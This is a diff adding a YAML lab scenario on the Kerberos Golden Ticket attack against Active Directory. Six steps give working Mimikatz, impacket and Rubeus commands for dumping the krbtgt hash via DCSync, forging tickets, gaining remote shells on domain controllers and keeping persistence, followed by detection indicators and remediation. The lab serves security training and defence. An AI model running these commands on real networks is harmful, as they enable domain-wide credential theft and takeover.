@@ -1,0 +1,203 @@
+# Category: Active Directory - Kerberos Attacks
+name: "Golden Ticket Attack"
+id: "ad-golden-ticket-001"
+category: "active_directory"
+subcategory: "kerberos_attacks"
+difficulty: "advanced"
+estimated_time: "60 minutes"
+
+description: |
+  Forge Kerberos Ticket Granting Tickets (TGTs) using the krbtgt NTLM hash to
+  gain persistent, domain-wide administrative access. Golden Tickets bypass
+  normal Kerberos authentication and can impersonate any user, including
+  non-existent ones, for up to 10 years.
+
+learning_objectives:
+  - Understand the krbtgt account role in Kerberos authentication
+  - Forge Golden Tickets using Mimikatz and impacket
+  - Use forged tickets for lateral movement and persistence
+  - Detect and respond to Golden Ticket attacks
+
+tools:
+  - mimikatz
+  - impacket
+  - rubeus
+  - crackmapexec
+
+prerequisites:
+  - Domain Admin or DCSync rights (to obtain krbtgt hash)
+  - krbtgt NTLM hash and domain SID
+  - Understanding of Kerberos TGT/TGS workflow
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Obtain krbtgt hash and domain SID via DCSync"
+    commands:
+      - "# DCSync to get krbtgt hash (Mimikatz)"
+      - "mimikatz.exe"
+      - "privilege::debug"
+      - "lsadump::dcsync /domain:[domain] /user:krbtgt"
+      - "# From Linux using impacket"
+      - "impacket-secretsdump '[domain]/[da_user]:[da_pass]' -dc-ip [dc_ip] -just-dc-user krbtgt"
+      - "# Get domain SID"
+      - "impacket-getPac '[domain]/[username]:[password]' -targetUser Administrator -dc-ip [dc_ip] | grep 'Domain SID'"
+      - "# From Windows"
+      - "Get-ADDomain | Select-Object DomainSID"
+      - "whoami /user  # Current user SID — domain SID is all but last segment"
+      - "wmic useraccount where name='krbtgt' get sid"
+    expected_output: "krbtgt NTLM hash (32-char hex) and domain SID (S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX)"
+    detection: "Event ID 4662 with replication GUID; DCSync traffic from non-DC"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Forge Golden Ticket with Mimikatz (Windows)"
+    commands:
+      - "# Forge Golden Ticket"
+      - "mimikatz.exe"
+      - "kerberos::golden /domain:[domain] /sid:[domain_sid] /rc4:[krbtgt_ntlm] /user:FakeAdmin /id:500 /ptt"
+      - "# With AES256 key (stealthier)"
+      - "kerberos::golden /domain:[domain] /sid:[domain_sid] /aes256:[krbtgt_aes256] /user:Administrator /id:500 /ptt"
+      - "# Specify ticket lifetime (default 10 years)"
+      - "kerberos::golden /domain:[domain] /sid:[domain_sid] /rc4:[krbtgt_ntlm] /user:FakeAdmin /id:500 /startoffset:0 /endin:600 /renewmax:10080 /ptt"
+      - "# Export ticket to file instead of injecting"
+      - "kerberos::golden /domain:[domain] /sid:[domain_sid] /rc4:[krbtgt_ntlm] /user:FakeAdmin /id:500 /ticket:C:\\temp\\golden.kirbi"
+      - "# Verify ticket injected"
+      - "klist"
+    expected_output: "Golden Ticket injected into current session; klist shows TGT for FakeAdmin"
+    detection: "Kerberos ticket with anomalous lifetime; non-existent username in Kerberos logs"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Forge Golden Ticket from Linux using impacket"
+    commands:
+      - "# Forge ticket"
+      - "impacket-ticketer -nthash [krbtgt_ntlm] -domain-sid [domain_sid] -domain [domain] FakeAdmin"
+      - "# With AES256"
+      - "impacket-ticketer -aesKey [krbtgt_aes256] -domain-sid [domain_sid] -domain [domain] Administrator"
+      - "# With extra SIDs for inter-forest escalation"
+      - "impacket-ticketer -nthash [krbtgt_ntlm] -domain-sid [domain_sid] -domain [domain] -extra-sid [enterprise_admins_sid] FakeAdmin"
+      - "# Set environment variable for use"
+      - "export KRB5CCNAME=/root/FakeAdmin.ccache"
+      - "# Verify ticket"
+      - "klist"
+    expected_output: "FakeAdmin.ccache file containing forged Golden Ticket"
+    detection: "ccache file created with forged credentials; impacket-ticketer execution"
+
+  - id: "step4"
+    phase: "post_exploitation"
+    action: "Use Golden Ticket for domain-wide access"
+    commands:
+      - "# PSExec on domain controller"
+      - "impacket-psexec -k -no-pass [domain]/FakeAdmin@[dc_ip]"
+      - "# WMIExec on any domain machine"
+      - "impacket-wmiexec -k -no-pass [domain]/FakeAdmin@[target_ip]"
+      - "# SMB access"
+      - "impacket-smbclient -k -no-pass [domain]/FakeAdmin@[dc_ip]"
+      - "# Run DCSync with Golden Ticket"
+      - "impacket-secretsdump -k -no-pass [domain]/FakeAdmin@[dc_ip] -just-dc"
+      - "# From Windows — after /ptt injection"
+      - "dir \\\\[dc_ip]\\C$"
+      - "PsExec.exe \\\\[dc_ip] cmd.exe"
+    expected_output: "SYSTEM shell on domain controller and unrestricted domain access"
+    detection: "Pass-the-Ticket logon events; privileged access from unexpected source with forged ticket"
+
+  - id: "step5"
+    phase: "post_exploitation"
+    action: "Convert and import Golden Ticket across formats"
+    commands:
+      - "# Convert .kirbi to .ccache (Mimikatz to impacket)"
+      - "impacket-ticket_converter FakeAdmin.kirbi FakeAdmin.ccache"
+      - "# Convert .ccache to .kirbi"
+      - "impacket-ticket_converter FakeAdmin.ccache FakeAdmin.kirbi"
+      - "# Import .kirbi with Rubeus"
+      - "Rubeus.exe ptt /ticket:C:\\temp\\golden.kirbi"
+      - "# Import .kirbi with Mimikatz"
+      - "kerberos::ptt C:\\temp\\golden.kirbi"
+      - "klist"
+    expected_output: "Ticket successfully converted and injected in target session"
+    detection: "Rubeus.exe ptt execution; Mimikatz kerberos::ptt in process logs"
+
+  - id: "step6"
+    phase: "post_exploitation"
+    action: "Golden Ticket persistence — long-term access"
+    commands:
+      - "# Store ticket for later use (valid until krbtgt password reset)"
+      - "mimikatz.exe 'kerberos::golden /domain:[domain] /sid:[domain_sid] /rc4:[krbtgt_ntlm] /user:Administrator /id:500 /ticket:C:\\temp\\golden_persist.kirbi' exit"
+      - "# Re-import when needed"
+      - "Rubeus.exe ptt /ticket:C:\\temp\\golden_persist.kirbi"
+      - "# Note: ticket valid as long as krbtgt hash unchanged"
+      - "# Even if account password reset, golden ticket still works"
+      - "# Only krbtgt double-reset invalidates existing golden tickets"
+    expected_output: "Persistent offline ticket for long-term domain access"
+    detection: "Stored .kirbi or .ccache files on disk; periodic re-injection activity"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1558.001"
+    description: "Steal or Forge Kerberos Tickets: Golden Ticket"
+  - standard: "NIST 800-53 Rev5"
+    control: "IA-5"
+    description: "Authenticator management"
+  - standard: "CIS Controls v8"
+    control: "5.4"
+    description: "Restrict administrator privileges"
+  - standard: "PCI DSS v4.0"
+    control: "8.3.9"
+    description: "Service accounts reviewed and managed"
+
+detection:
+  network_indicators:
+    - "Kerberos TGT with 10-year lifetime (default Mimikatz Golden Ticket)"
+    - "TGT for non-existent user account used to access resources"
+    - "Kerberos ticket with logon count of 0 (forged tickets)"
+  log_indicators:
+    - "Event ID 4769: TGS request with anomalous ticket lifetime"
+    - "Event ID 4624 Type 3: Network logon with forged ticket (no corresponding AS-REQ 4768)"
+    - "Defender for Identity: Golden Ticket activity alert"
+    - "Event ID 4672: Special privileges assigned — but no prior 4768 for that session"
+  endpoint_indicators:
+    - "Mimikatz execution artifacts"
+    - ".kirbi or .ccache files in temp directories"
+    - "klist showing TGT for unexpected username"
+
+remediation:
+  immediate:
+    - "Reset krbtgt password TWICE (72 hours apart) to invalidate all existing Golden Tickets"
+    - "Reset all privileged account passwords after krbtgt reset"
+    - "Identify and contain systems where krbtgt hash was extracted"
+  long_term:
+    - "Deploy Microsoft Defender for Identity (MDI) for Golden Ticket detection"
+    - "Implement Kerberos armoring (FAST) to protect TGT requests"
+    - "Enable Protected Users group for all privileged accounts"
+    - "Schedule annual krbtgt password rotation as part of security program"
+
+variables:
+  domain: "corp.example.com"
+  dc_ip: "192.168.1.10"
+  target_ip: "192.168.1.50"
+  da_user: "DomainAdmin"
+  da_pass: "Admin123!"
+  username: "jsmith"
+  password: "Password123"
+  krbtgt_ntlm: "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+  krbtgt_aes256: "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+  domain_sid: "S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX"
+  enterprise_admins_sid: "S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-519"
+
+assessment_questions:
+  - "Why must the krbtgt password be reset TWICE to invalidate Golden Tickets?"
+  - "How does a Golden Ticket differ from a Silver Ticket?"
+  - "What event ID indicates a TGS request without a prior TGT request (Golden Ticket indicator)?"
+  - "Why does adding /extra-sid to a Golden Ticket enable inter-forest attacks?"
+  - "How does AES256 usage in Golden Tickets reduce detection likelihood versus RC4?"
+
+references:
+  - url: "https://attack.mitre.org/techniques/T1558/001/"
+    title: "MITRE ATT&CK - Golden Ticket"
+  - url: "https://adsecurity.org/?p=1640"
+    title: "Mimikatz Golden Ticket - ADSecurity"
+  - url: "https://github.com/gentilkiwi/mimikatz"
+    title: "Mimikatz"
+  - url: "https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-mitigating-active-directory-compromises/"
+    title: "Detecting and Mitigating AD Compromises - Microsoft"
